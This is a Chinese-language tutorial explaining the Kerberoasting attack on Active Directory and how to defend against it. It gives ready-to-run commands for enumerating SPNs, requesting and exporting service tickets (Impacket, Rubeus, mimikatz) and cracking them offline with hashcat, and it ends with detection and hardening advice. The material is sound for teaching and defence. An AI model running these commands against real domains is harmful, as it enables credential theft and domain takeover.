# Kerberosating攻击

Kerberosating攻击发生在Kerberos协议的TGS_REP阶段，KDC的TGS服务返回一个由服务Hash
加密的ST给客户端。由于该ST是用服务Hash进行加密的，因此客户端在拿到该ST后可以用于本地离线爆破。如果攻击者的密码字典足够强大，则很有可能爆破出SPN链接用户的明文密码。如果该服务在域内被配置为高权限运行，那么攻击者可能接管整个域。

整个过程的核心点在于，攻击者和KDC协商ST加密的时候，协商的是使用RC4_HMAC_MD5加密算法。而该加密算法比较容易被破解，因此攻击者能在本地进行离线爆破。

## Kerberosating攻击过程

![图片.png](https://image.3001.net/images/20230430/1682870110_644e8f5e6fb0aea216f15.png!small)

1）攻击者提供一个正常的域用户密码对域进行身份认证，KDC在验证账户和密码的有效性，会返回一个TGT。该TGT用于以后的ST请求。

2）攻击者使用获得的TGT请求针对指定SPN的ST。在请求服务票据的TGS-REQ过程中，攻击者可以指定其支持的Kerberos加密类型为RC4_HMAC_MD5(ARCFOUR-HMAC-MD5),因为RC4_HMAC_MD5加密算法比较相比于其他加密算法更容易被破解。

3）如果攻击者的TGT是有效的，不管提供的域账户有无访问指定SPN服务的权限，KDC都会查找哪个账户在ServicedPrincipalName属性中注册了所请求的SPN，然后用该用户的Hash以RC4_HMAC_MD5加密类型加密ST并在TGS_REP包中发送给攻击者。

4）攻击者从TGS_REP包中提取加密的ST。由于该ST是用链接到请求的SPN的账户Hash加密的，因此攻击者可以本地离线破解。如果攻击者的字典足够强大，则可以爆破出该SPN所链接账户的明文密码。

 **注意：Kerberoasting攻击一般只针对注册用户的SPN，因为机器账户的密码是随机生成的128位字符，是不可能爆破出来的**

Kerberosating攻击在实战中主要分为以下四步：

  1. 查询域内注册于域用户下的SPN

  2. 请求指定的SPN的ST

  3. 导出请求的ST

  4. 对该导出的ST进行离线爆破

## SPN的发现

这是Kerberosating攻击的第一步。首先，发现域内所有用户注册于域用户的SPN。默认情况下，域内会有一个注册在用户Krbtgt下的SPN
kadmin/changepw。但该SPN对于Kerberosating攻击是没有意义的，因为用户Krbtgt的密码是随机生成的，几乎不可能爆破出来。

我们可以使用以下以下几款工具进行SPN的发现。

### RiskySPN

[RiskySPN工具下载地址](https://github.com/cyberark/RiskySPN)

RiskySPN是一个Powershell脚本的集合，专注于检测与SPN相关的账户是否滥用。该脚本可以帮助我们自动识别弱密码服务票据，根据用户账户和密码过期时间来查找最容易包含弱密码的票据。执行如下的命令，该脚本会自动查找并过滤出（自动去除注册于Krbtgt下的Kadmin/changepw）当前域内注册于域用户下的可能包含弱密码的SPN的详细信息。

    
    
    Import-Module .\Find-PotentiallyCrackableAccounts.ps1;
    Find-PotentiallyCrackableAccounts -FullData
    

运行Find-PotentiallyCrackableAccounts.ps1脚本探测域内注册于用户下的SPN，如图所示，可以看到探测出用户jack下注册了SPN

![图片.png](https://image.3001.net/images/20230430/1682870128_644e8f7070bc20365425f.png!small)

### GetUserSPNs

[GetUserSPNs工具下载地址](https://github.com/nidem/kerberoast)

GetUserSPNs是kerberoast工具集中查询注册于域内用户下的SPN的脚本，该脚本会查询域内所用注册于用户下的SPN，包括注册于Krbtgt下的Kadmin/changepw。该工具集合有PowerShell和VBS两种语言的脚本，使用命令如下：

    
    
    #VBS脚本的用法
    cscript .\GetUserSPNs.vbs
    # PowerShell 脚本的用法
    Import-Module .\GetUserSPNs.ps1
    

![图片.png](https://image.3001.net/images/20230430/1682870150_644e8f8616742d592be3a.png!small)

### PowerView.ps1

PowerView.ps1是PowerSpolit中Recon目录下的PowerShell脚本，该脚本可用于查询出域用户下注册了SPN的用户，包括Krbtgt用户，并返回用户的详细信息。该脚本使用命令如下：

    
    
    Import-Module .\PowerView.ps1
    Get-NetUser -SPN
    

![图片.png](https://image.3001.net/images/20230430/1682870165_644e8f95d0cd028673fe8.png!small)

## 请求服务票据

当过滤出注册于用户下的SPN之后，我们就需要请求这些SPN的服务票据了。下面介绍几款进行SPN服务票据请求的工具

### Impacket 请求

[Impacket下载地址](https://github.com/fortra/impacket)

Impacket
中的GetUserSPNs.py脚本可以请求注册于用户下的所有SPN的服务票据，也可以请求注册于指定于用户下的SPN的服务票据。该脚本使用的命令如下：

    
    
    #请求注册于用户下的所有SPN的服务票据，并以hashcat能破解的格式保存为hash.txt文件
    python3 GetUserSPNs.py -request -dc-ip 192.168.41.10 hack.com/jack:Admin123 -outputfile hash.txt
    
    #请求注册于指定用户jack下的SPN的服务票据，并以hashcat能破解的格式保存为hash2.txt文件
    python3 GetUserSPNs.py -request -dc-ip 192.168.41.10 hack.com/jack:Admin123 -outputfile hash2.txt -request-user jack
    

如图所示为请求注册于指定用户jack下的SPN的服务票据的运行结果

![图片.png](https://image.3001.net/images/20230430/1682870191_644e8faf76f0ee5e78869.png!small)

![图片.png](https://image.3001.net/images/20230430/1682870200_644e8fb8aaa854fd460be.png!small)

### Rubeus 请求

Rubeus 中的Kerberoast
支持对所有用户或特定用户执行Kerberoasting操作，它的原理在于先用LDAP查询域内所有注册在域用户下的SPN（除了Kadmin/changepw），再通过发送TGS包，直接输出能使用John或hashcat爆破的Hash。该工具的使用命令如下：

    
    
    #请求注册于用户下的所有SPN的服务票据，并以hashcat能破解的格式保存为hash.txt文件
    Rubeus.exe kerberoast /format:hashcat /outfile:hash.txt
    
    #请求注册于用户下的指定SPN的服务票据，并以john能破解的格式保存为hash2.txt文件
    Rubeus.exe kerberoast /spn:SQLServer/DC.hack.com:1433/MSSQL /format:john /outfile:hash2.txt
    

![图片.png](https://image.3001.net/images/20230430/1682870230_644e8fd66622778b53b55.png!small)

![图片.png](https://image.3001.net/images/20230430/1682870241_644e8fe116c3322404378.png!small)

### mimikatz 请求

使用mimikatz请求指定SPN的服务票据的命令如下，请求的服务票据将保存在内存中，如图所示：

    
    
    #请求指定SPN的服务票据
    kerberos::ask /target:SQLServer/DC.hack.com:1433/MSSQL
    

![图片.png](https://image.3001.net/images/20230430/1682870262_644e8ff62b2b05dcd1758.png!small)

## 导出服务票据

在请求服务票据的过程中，有的工具可以直接将票据打印出来保存为文件，而有的工具会将票据保存在内存中。对于保存在内存中的票据。可以使用以下的命令查看：

    
    
    #直接在cmd窗口执行
    Klist
    #在mimikatz下面执行
    Kerberos::list
    

查看了内存中的票据之后，我们就需要将其导出为文件了

![图片.png](https://image.3001.net/images/20230430/1682870279_644e900711f35e2164341.png!small)

### 使用mimikatz导出票据

使用mimikatz将内存中的的票据导出来的命令如下，执行完成后，会在mimikatz同目录下导出.kirbi格式的票据文件。

    
    
    mimikatz.exe "kerberos::list /export" "exit"
    

![图片.png](https://image.3001.net/images/20230430/1682870299_644e901bec09ed4a6a9ca.png!small)

## 离线破解服务票据

通过前几步取得了.kirbi票据文件或hashcat、John能直接破解的文件，接下来就需要本地离线破解服务票据了。

### kerberoast

kerberoast是用于攻击Kerberos实现的一些工具的集合。该工具中的tgsrepcrack.py脚本可以对mimikatz导出的.kirbi格式的票据进行爆破。

使用tgsrepcrack.py脚本离线破解.kirbi文件的命令如下，如图所示，可以看到破解的密码为Admin123

    
    
    python3 tgsrepcrack.py pass.txt 1-40a10000-Administrator@SQLSever\~DC.hack.com\~1433\~MSSQL-HACK.COM.kirbi
    

![图片.png](https://image.3001.net/images/20230430/1682870319_644e902fc18e2c5117def.png!small)

### hashcat

针对Impacket和Rebeus请求的票据格式，可以使用hashcat执行如下的命令来进行爆破。

    
    
    hashcat -m 13100 hash.txt pass.txt --force
    

## Kerberoasting攻击防御

对于防守方的蓝方来说，如何针对Kerberoasting攻击检测和防御呢？总的来说，有如下几点：

1）确保服务账户和密码为强密码，具有随机性并定期修改。  
2）Kerberoasting能成功的最大因素就是KDC返回的ST是用RC4_HMAC_MD5加密算法加密的，攻击者可以比较简单地进行爆破。如果配置了强制使用AES256_HMAC方式对Kerberos票据进行加密，那么即使攻击者获取了ST，也无法将其破解。但这种加密方式存在兼容性的问题。  
3）许多服务账户在域中被分配了过高的权限，从而导致了攻击者在破解该服务账户的密码后，能迅速进行域内权限提升。因此，应该对域内的服务账户权限进行限制，采取最小化权限的原则。  
4）防守方在检测Kerberoasting攻击时，可以进行日志审计，重点关注事件ID为4769（请求Kerberos服务票据操作）的日志。如果有过多的4769日志，可以对事件ID为4769的日志进行筛选，筛选出票据加密类型为0x17（RC4_HMAC）的日志。

